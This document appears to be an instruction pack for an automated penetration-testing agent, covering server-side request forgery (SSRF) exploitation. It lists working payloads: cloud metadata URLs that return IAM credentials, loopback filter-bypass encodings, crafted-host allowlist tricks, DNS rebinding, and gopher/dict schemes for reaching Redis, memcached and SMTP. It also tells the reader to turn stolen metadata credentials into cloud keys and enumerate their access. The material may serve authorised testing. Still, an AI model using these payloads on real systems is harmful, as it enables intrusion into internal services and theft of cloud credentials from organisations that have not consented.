# SSRF exploitation and escalation

A parameter makes the server fetch a URL, or a service can be reached only from
the inside. This pack turns that into internal access.

## Before you touch anything

Confirm the fetch actually originates server-side: point it at a listener you
control (`nc -lvnp 4444`, an HTTP server) and watch for the hit. If the request
comes from your own browser, it is not SSRF.

## 1. Reachability

- Loopback: `http://127.0.0.1:<port>/`, `http://localhost/`.
- Cloud metadata:
  - AWS `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
  - GCP `http://metadata.google.internal/computeMetadata/v1/` (needs
    `Metadata-Flavor: Google`)
  - Azure `http://169.254.169.254/metadata/instance?api-version=2021-02-01`
    (needs `Metadata: true`)
- Internal-only services on discovered ports from `state_query services`.

## 2. Filter bypass

Try, in order: `http://127.1/`, `http://0177.0.0.1/`, `http://2130706433/`,
`http://[::1]/`, `http://127.0.0.1.nip.io/`, decimal/octal/hex IPs, a redirect
you control, and DNS rebinding. Allowlists often match a prefix — a crafted
host like `http://target.com@127.0.0.1/` or `http://127.0.0.1#target.com` slips
past naive checks.

## 3. Escalation

- A readable metadata credential becomes a cloud key: hand it to the cloud
  tooling (see the `cloud-attack` pack) and enumerate what it can do.
- `file://`, `gopher://`, `dict://` widen reach to local files and raw TCP
  (gopher can speak to Redis, memcached, SMTP).
- SSRF into an internal admin panel or an unauthenticated API is often the
  whole engagement; record the internal host as a `host` and the access as an
  `edge`.

## 4. Proving it

Log the inbound request on your listener with the server's source address, or
capture the internal response body. Those are the proof — a parameter merely
named `url` is not.
